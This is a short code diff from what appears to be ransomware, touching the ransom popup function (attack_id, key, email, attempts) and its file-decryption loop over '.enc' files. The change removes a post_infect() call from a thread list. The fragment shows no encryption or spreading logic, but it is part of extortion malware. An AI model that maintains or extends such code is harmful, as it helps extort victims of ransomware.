@@ -311,7 +311,7 @@ def popup_window(attack_id, key, email, attempts):
                                       f"closed automatically.")
             files = find_to_decrypt()
 
-            threads3 = [post_infect(), disinfect_stidium()]
+            threads3 = [disinfect_stidium()]
             for file_path in files:
                 file_path += ".enc"
                 t3 = threading.Thread(target=decrypt_file, args=(file_path, key_entry.get()))
